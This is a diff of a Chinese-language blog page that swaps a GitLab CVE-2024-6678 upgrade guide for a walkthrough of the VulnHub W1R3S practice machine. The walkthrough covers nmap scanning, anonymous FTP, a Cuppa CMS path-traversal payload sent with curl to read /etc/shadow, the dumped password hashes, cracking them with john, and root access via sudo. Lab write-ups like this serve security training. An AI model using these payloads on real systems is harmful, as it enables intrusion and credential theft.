@@ -3,7 +3,7 @@
 <html lang="en">
 <head>
     <meta charset="utf-8" />
-    <title>CVE-2024-6678漏洞修复方案 | Alice01</title>
+    <title>vulnhub-W1R3S | Alice01</title>
     <meta name="author" content="Alice01" />
     <meta name="description" content="" />
     <meta name="keywords" content="" />
@@ -114,14 +114,14 @@
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
             <div class="article">
     <div>
-        <h1>CVE-2024-6678漏洞修复方案</h1>
+        <h1>vulnhub-W1R3S</h1>
     </div>
     <div class="info">
         <span class="date">
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2025/3/20
+            2025/8/18
         </span>
         
         
@@ -133,8 +133,8 @@
             
             <span class="tag">
                 
-                <a href="/tags/%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8DSOP/" style="color: #00a596">
-                    漏洞修复SOP
+                <a href="/tags/%E5%86%85%E7%BD%91/" style="color: #ffa2c4">
+                    内网
                 </a>
             </span>
             
@@ -143,17 +143,55 @@
     </div>
     
     <div class="content" v-pre>
-        <h2 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h2><h4 id="1-1漏洞描述"><a href="#1-1漏洞描述" class="headerlink" title="1.1漏洞描述"></a>1.1漏洞描述</h4><p>GitLab 是一个基于 Git 的代码仓库管理平台</p>
-<p>攻击者可通过低权限账户或未授权访问，利用 GitLab 的访问控制机制缺陷，以其他用户身份触发 CI&#x2F;CD 管道。具体而言，漏洞涉及 GitLab 的“环境停止操作”功能权限校验不严格，允许攻击者绕过身份验证，模拟高权限用户（如项目维护者或管理员）执行环境停止操作，进而注入恶意代码或篡改流程</p>
-<h4 id="1-2影响范围"><a href="#1-2影响范围" class="headerlink" title="1.2影响范围"></a>1.2影响范围</h4><p>8.14 &lt;&#x3D; GitLab CE&#x2F;EE &lt; 17.1.7</p>
-<p>17.2 &lt;&#x3D; GitLab CE&#x2F;EE &lt; 17.2.5</p>
-<p>17.3 &lt;&#x3D; GitLab CE&#x2F;EE &lt; 17.3.2</p>
-<h2 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2.环境搭建"></a>2.环境搭建</h2><span id="more"></span>
-
-<h4 id="2-1Linux下漏洞环境准备"><a href="#2-1Linux下漏洞环境准备" class="headerlink" title="2.1Linux下漏洞环境准备"></a>2.1Linux下漏洞环境准备</h4><p>检查版本信息，GitLab版本为16.2.1-ce，属于漏洞覆盖范围内<br>cat &#x2F;opt&#x2F;gitlab&#x2F;embedded&#x2F;service&#x2F;gitlab-rails&#x2F;VERSION<br><img src="/images/CVE-2024-6678%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88/1.png"></p>
-<h2 id="3-漏洞验证"><a href="#3-漏洞验证" class="headerlink" title="3.漏洞验证"></a>3.漏洞验证</h2><h4 id="3-1版本检测"><a href="#3-1版本检测" class="headerlink" title="3.1版本检测"></a>3.1版本检测</h4><p>影响版本：8.14 ≤ GitLab &lt; 17.1.7、17.2 ≤ GitLab &lt; 17.2.5、17.3 ≤ GitLab &lt; 17.3.2<br>若当前版本在受影响范围内且未升级到修复版本，则存在风险<br><img src="/images/CVE-2024-6678%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88/2.png"></p>
-<h2 id="4-漏洞修复"><a href="#4-漏洞修复" class="headerlink" title="4.漏洞修复"></a>4.漏洞修复</h2><h4 id="4-1版本升级"><a href="#4-1版本升级" class="headerlink" title="4.1版本升级"></a>4.1版本升级</h4><p><img src="/images/CVE-2024-6678%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88/3.png"><br>sudo apt-cache madison gitlab-ce查看所有版本注意不要直接跨大版本升级,否则报错,需要按官方升级文档按顺序依次升级<br><img src="/images/CVE-2024-6678%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88/4.png">apt install gitlab-ce&#x3D;xx.x.x-ce.0<br><img src="/images/CVE-2024-6678%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88/5.png"><br><img src="/images/CVE-2024-6678%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88/6.png">升级后通过命令查看版本是否提高<br>cat &#x2F;opt&#x2F;gitlab&#x2F;embedded&#x2F;service&#x2F;gitlab-rails&#x2F;VERSION<br><img src="/images/CVE-2024-6678%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88/7.png">继续重复升级,升级到不被漏洞影响的版本<br>sudo apt install gitlab-ce&#x3D;17.0.5-ce.0<br>sudo apt install gitlab-ce&#x3D;17.3.6-ce.0<br>升级后通过命令查看版本是否提高<br>cat &#x2F;opt&#x2F;gitlab&#x2F;embedded&#x2F;service&#x2F;gitlab-rails&#x2F;VERSION<img src="/images/CVE-2024-6678%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88/8.png">已升级到Gitlab漏洞影响范围外版本</p>
-<h2 id="5-漏洞复验"><a href="#5-漏洞复验" class="headerlink" title="5.漏洞复验"></a>5.漏洞复验</h2><h4 id="5-1版本检测"><a href="#5-1版本检测" class="headerlink" title="5.1版本检测"></a>5.1版本检测</h4><p>影响版本：8.14 ≤ GitLab &lt; 17.1.7、17.2 ≤ GitLab &lt; 17.2.5、17.3 ≤ GitLab &lt; 17.3.2<br>若当前版本不在受影响范围内或升级到修复版本，则完成修复<img src="/images/CVE-2024-6678%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88/9.png"></p>
+        <h2 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h2><blockquote>
+<p>nmap -p- –min-rate 1000 -sT -sV -O 192.168.206.130</p>
+</blockquote>
+<p>PORT     STATE SERVICE VERSION<br>21&#x2F;tcp   open  ftp     vsftpd 2.0.8 or later<br>22&#x2F;tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)<br>80&#x2F;tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))<br>3306&#x2F;tcp open  mysql   MySQL (unauthorized)<br>MAC Address: 00:0C:29:6F:43:28 (VMware)<br>Aggressive OS guesses: Linux 3.10 - 4.11 (98%), Linux 5.1 - 5.15 (95%), Linux 3.2 - 4.14 (94%), Linux 3.13 - 4.4 (94%), Linux 4.10 (94%), Linux 4.4 (93%), Linux 3.10 (92%), Linux 3.16 - 4.6 (92%), OpenWrt 19.07 (Linux 4.14) (92%), Linux 2.6.32 - 3.13 (91%)<br>No exact OS matches for host (test conditions non-ideal).<br>Network Distance: 1 hop<br>Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</p>
+<blockquote>
+<p>nmap -p- –min-rate 1000 -sU 192.168.206.130</p>
+</blockquote>
+<p>PORT     STATE  SERVICE<br>3306&#x2F;udp closed mysql</p>
+<blockquote>
+<p>nmap -p- –min-rate 1000 –script&#x3D;vuln 192.168.206.130</p>
+</blockquote>
+<p>PORT     STATE SERVICE<br>21&#x2F;tcp   open  ftp<br>22&#x2F;tcp   open  ssh<br>80&#x2F;tcp   open  http<br>|_http-csrf: Couldn’t find any CSRF vulnerabilities.<br>|<em>http-dombased-xss: Couldn’t find any DOM based XSS.<br>| http-slowloris-check:<br>|   VULNERABLE:<br>|   Slowloris DOS attack<br>|     State: LIKELY VULNERABLE<br>|     IDs:  CVE:CVE-2007-6750<br>|       Slowloris tries to keep many connections to the target web server open and hold<br>|       them open as long as possible.  It accomplishes this by opening connections to<br>|       the target web server and sending a partial request. By doing so, it starves<br>|       the http server’s resources causing Denial Of Service.<br>|<br>|     Disclosure date: 2009-09-17<br>|     References:<br>|       <a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</a><br>|</em>      <a target="_blank" rel="noopener" href="http://ha.ckers.org/slowloris/">http://ha.ckers.org/slowloris/</a><br>|<em>http-stored-xss: Couldn’t find any stored XSS vulnerabilities.<br>| http-enum:<br>|</em>  &#x2F;wordpress&#x2F;wp-login.php: Wordpress login page.<br>3306&#x2F;tcp open  mysql</p>
+<h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>匿名用户</p>
+<blockquote>
+<p>anonymous&#x2F;null</p>
+</blockquote>
+<p><img src="/images/vulnhub-W1R3S/1.jpg"><br>mget下载01.txt;02.txt;03.txt;worktodo.txt;employee-names.txt到本地,均无敏感信息<br><img src="/images/vulnhub-W1R3S/2.jpg"></p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>目录扫描出cms路径,安装利用失败<br>&#x2F;administrator&#x2F;installation<br><img src="/images/vulnhub-W1R3S/3.jpg"></p>
+<p>cms有文件包含exp</p>
+<blockquote>
+<p>searchsploit cuppa</p>
+</blockquote>
+<p><img src="/images/vulnhub-W1R3S/4.jpg"></p>
+<p>下载exp</p>
+<blockquote>
+<p>searchsploit cupa -m 25971.txt</p>
+</blockquote>
+<p><img src="/images/vulnhub-W1R3S/5.jpg"><br>该cms默认payload</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/shadow">http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/shadow</a></p>
+</blockquote>
+<p><img src="/images/vulnhub-W1R3S/6.jpg"><br>需要参数用post+urlencode,得出最终payload</p>
+<blockquote>
+<p>curl <a target="_blank" rel="noopener" href="http://192.168.206.130/administrator/alerts/alertConfigField.php">http://192.168.206.130/administrator/alerts/alertConfigField.php</a> –data-urlencode “urlConfig&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;shadow”</p>
+</blockquote>
+<p>回显中三个密码为</p>
+<blockquote>
+<p>root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx.&#x2F;ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ<br>data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8&#x2F;0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud<br>w1r3s:$6$xe&#x2F;eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb&#x2F;io7x9q1i</p>
+</blockquote>
+<p>解密<br>john 1.txt 解出w1r3s密码</p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><blockquote>
+<p>ssh w1r3s&#x2F;computer</p>
+</blockquote>
+<p><img src="/images/vulnhub-W1R3S/7.jpg"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>sudo -l为all<br><img src="/images/vulnhub-W1R3S/8.jpg"><br>直接提权</p>
+<blockquote>
+<p>sudo &#x2F;bin&#x2F;bash</p>
+</blockquote>
+<p><img src="/images/vulnhub-W1R3S/9.jpg"></p>
 
     </div>
     
